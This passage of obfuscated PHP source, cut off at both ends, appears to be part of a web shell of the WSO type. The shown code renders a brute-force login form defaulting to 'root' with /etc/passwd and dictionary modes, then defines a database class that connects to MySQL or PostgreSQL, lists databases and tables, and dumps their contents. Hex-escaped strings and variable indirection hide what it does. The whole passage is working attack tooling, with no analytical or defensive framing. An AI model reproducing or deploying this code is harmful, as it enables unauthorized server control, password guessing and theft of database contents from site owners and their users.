\x64en na\x6de=\x61\x20value=\x22".htmlspecialchars($_POST["a"])."\">"."<in\x70\x75\x74\x20\x74\x79pe\x3d\x68\x69dd\x65n\x20name\x3d\x63\x68\x61r\x73\x65\x74\x20va\x6c\x75e=\x22".htmlspecialchars($_POST["c\x68\x61rse\x74"])."\x22>"."<s\x70an>\x53\x65r\x76er:\x70\x6f\x72t</\x73p\x61n></\x74\x64\x3e"."<\x74d><i\x6ep\x75t t\x79\x70\x65=\x74\x65x\x74 \x6e\x61me\x3dserv\x65r\x20\x76al\x75e=\x22127.\x30\x2e\x30\x2e\x31\x22>\x3c/td>\x3c/tr\x3e"."<tr><\x74\x64>\x3c\x73\x70\x61n\x3e\x42r\x75\x74\x65 t\x79pe\x3c/\x73\x70\x61\x6e\x3e</t\x64>"."\x3ct\x64\x3e\x3c\x6c\x61be\x6c>\x3c\x69npu\x74 t\x79pe=r\x61\x64\x69\x6f\x20\x6ea\x6d\x65\x3dtype\x20va\x6cu\x65=\"1\x22\x20chec\x6be\x64\x3e /\x65\x74\x63/pas\x73\x77\x64</la\x62\x65l\x3e</td\x3e\x3c/t\x72\x3e"."\x3ct\x72\x3e<td\x3e\x3c/\x74\x64\x3e<\x74\x64>\x3c\x6c\x61\x62\x65l\x20s\x74y\x6ce=\x22\x70\x61\x64\x64\x69n\x67-\x6ce\x66\x74:15p\x78\x22\x3e\x3cinpu\x74\x20ty\x70\x65=ch\x65\x63\x6bbox\x20n\x61\x6de\x3d\x72\x65verse\x20\x76a\x6c\x75e\x3d\x31\x20c\x68e\x63\x6be\x64\x3e revers\x65\x20(log\x69n -\x3e\x20n\x69\x67ol)</\x6c\x61b\x65\x6c>\x3c/t\x64\x3e\x3c/tr\x3e"."<\x74r\x3e<td></td><\x74d\x3e\x3cl\x61b\x65\x6c><in\x70\x75t\x20t\x79p\x65=\x72\x61\x64\x69o \x6e\x61\x6de\x3d\x74yp\x65\x20\x76\x61l\x75\x65=\"\x32\"\x3e \x44i\x63\x74i\x6f\x6ear\x79\x3c/\x6c\x61b\x65l></td></\x74r\x3e"."<tr><t\x64\x3e</\x74\x64\x3e<\x74\x64><\x74ab\x6c\x65\x20st\x79\x6ce=\"\x70\x61\x64\x64i\x6eg-l\x65\x66\x74:\x315\x70\x78\">\x3c\x74r\x3e<\x74\x64>\x3c\x73p\x61\x6e>Lo\x67i\x6e</\x73\x70\x61n>\x3c/\x74\x64\x3e"."\x3ctd><\x69n\x70u\x74\x20\x74y\x70e=te\x78\x74\x20\x6e\x61me=\x6co\x67\x69n\x20\x76a\x6cu\x65=\"r\x6f\x6f\x74\">\x3c/\x74d>\x3c/\x74r>"."<\x74\x72\x3e\x3c\x74d\x3e<s\x70an\x3e\x44i\x63\x74\x69o\x6ea\x72y</s\x70an>\x3c/\x74d\x3e"."\x3c\x74d>\x3cin\x70\x75\x74\x20\x74\x79pe=tex\x74\x20\x6e\x61\x6d\x65\x3d\x64\x69\x63t\x20\x76a\x6cu\x65\x3d\"".htmlspecialchars($GLOBALS["c\x77d"])."p\x61ss\x77d\x2edi\x63\x22></\x74d>\x3c/\x74\x72>\x3c/\x74ab\x6ce\x3e"."\x3c/t\x64\x3e</tr\x3e<\x74r\x3e<t\x64\x3e\x3c/t\x64\x3e\x3ctd><in\x70ut\x20\x74\x79\x70\x65\x3ds\x75\x62\x6d\x69\x74\x20\x76a\x6c\x75\x65=\"\x3e>\">\x3c/t\x64\x3e</tr\x3e\x3c/fo\x72\x6d></\x74a\x62\x6c\x65>";echo"\x3c/\x64\x69\x76>\x3c\x62r>";printFooter();}function actionSql(){class DbClass{var$type;var$link;var$res;function DbClass($type){$nxukley="t\x79pe";$this->type=${$nxukley};}function connect($host,$user,$pass,$dbname){$vtclwtsl="\x70\x61ss";${"GL\x4f\x42A\x4cS"}["\x65\x67s\x73b\x6dc\x67\x6f\x6d\x64"]="\x75\x73\x65\x72";switch($this->type){case"\x6d\x79s\x71l":if($this->link=@mysql_connect($host,${${"GL\x4f\x42\x41L\x53"}["\x65g\x73\x73\x62m\x63g\x6f\x6dd"]},${$vtclwtsl},true))return true;break;case"p\x67sq\x6c":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("h\x6fs\x74\x3d{$host[0]}\x20\x70o\x72\x74={$host[1]}\x20u\x73er=$user \x70\x61s\x73wo\x72\x64\x3d$pass \x64\x62\x6e\x61\x6d\x65\x3d$dbname"))return true;break;}return false;}function selectdb($db){switch($this->type){case"mysq\x6c":if(@mysql_select_db(${${"G\x4c\x4fB\x41\x4c\x53"}["e\x71xkg\x6c\x6a"]}))return true;break;}return false;}function query($str){$xhhccuwuj="s\x74r";switch($this->type){case"mys\x71l":return$this->res=@mysql_query(${$xhhccuwuj});break;case"\x70gsql":return$this->res=@pg_query($this->link,${${"\x47\x4c\x4fB\x41LS"}["g\x72\x71\x76\x62\x67\x64i"]});break;}return false;}function fetch(){$gbjhmd="\x72\x65\x73";${${"G\x4c\x4f\x42\x41LS"}["j\x66b\x71t\x75\x61\x68\x72"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"m\x79\x73ql":return@mysql_fetch_assoc(${${"\x47\x4c\x4f\x42\x41\x4cS"}["j\x66bq\x74\x75\x61\x68r"]});break;case"p\x67\x73q\x6c":return@pg_fetch_assoc(${$gbjhmd});break;}return false;}function listDbs(){switch($this->type){case"\x6dy\x73q\x6c":return$this->res=@mysql_list_dbs($this->link);break;case"\x70gs\x71\x6c":return$this->res=$this->query("S\x45L\x45\x43T da\x74n\x61\x6d\x65 FR\x4fM pg\x5f\x64ata\x62a\x73e");break;}return false;}function listTables(){switch($this->type){case"my\x73q\x6c":return$this->res=$this->query("\x53H\x4f\x57 \x54A\x42\x4c\x45S");break;case"\x70g\x73q\x6c":return$this->res=$this->query("se\x6c\x65\x63\x74 \x74able_n\x61\x6de\x20\x66\x72o\x6d\x20inf\x6f\x72\x6dat\x69o\x6e_\x73\x63he\x6d\x61\x2e\x74ab\x6c\x65\x73\x20wh\x65r\x65\x20(\x74\x61bl\x65\x5f\x73che\x6d\x61\x20!\x3d\x20'in\x66o\x72mat\x69\x6f\x6e_s\x63\x68e\x6da' A\x4eD\x20\x74\x61b\x6c\x65\x5fs\x63\x68e\x6da\x20\x21\x3d '\x70g\x5f\x63a\x74\x61lo\x67\x27)\x20\x6fr\x20\x74\x61ble_\x6eame =\x20\x27pg_\x75ser'");break;}return false;}function error(){switch($this->type){case"\x6dy\x73\x71\x6c":return@mysql_error($this->link);break;case"\x70\x67\x73\x71l":return@pg_last_error($this->link);break;}return false;}function setCharset($str){$tezihxq="st\x72";$jkhfyd="\x73\x74\x72";$rsenys="s\x74\x72";switch($this->type){case"\x6dysql":if(function_exists("m\x79s\x71l\x5fse\x74\x5f\x63\x68a\x72\x73\x65t"))return@mysql_set_charset(${$jkhfyd},$this->link);else$this->query("\x53E\x54\x20\x43HA\x52\x53\x45T ".${$tezihxq});break;case"m\x79\x73\x71\x6c":return@pg_set_client_encoding($this->link,${$rsenys});break;}return false;}function dump($table){$obyrnsmseqx="r\x65\x73";${"G\x4c\x4f\x42A\x4c\x53"}["\x77\x76\x6a\x64\x77\x78\x74\x6c\x6be\x72"]="\x69\x74e\x6d";${"\x47\x4c\x4fBA\x4cS"}["\x71u\x6e\x64\x68\x67\x70\x72\x76\x68"]="\x63\x72\x65\x61\x74\x65";$vmgqsoh="\x74a\x62\x6c\x65";$uimsgi="\x74\x61\x62\x6c\x65";$eqhrlkurg="\x72\x65s";switch($this->type){case"m\x79\x73ql":${$eqhrlkurg}=$this->query("\x53HO\x57\x20CRE\x41\x54E \x54\x41\x42L\x45 \x60".${${"G\x4c\x4f\x42\x41LS"}["o\x6bew\x6at\x75\x75"]}."`");${${"GLOBAL\x53"}["\x6be\x61\x68\x6cx\x6d\x6e\x75"]}=mysql_fetch_array(${$obyrnsmseqx});echo${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x71u\x6ed\x68\x67\x70\x72v\x68"]}[1].";\n\n";$this->query("\x53\x45LECT\x20* \x46R\x4fM\x20\x60".${$vmgqsoh}."`");while(${${"\x47\x4c\x4f\x42A\x4cS"}["\x74\x72\x75\x63\x79\x6a\x6c"]}=$th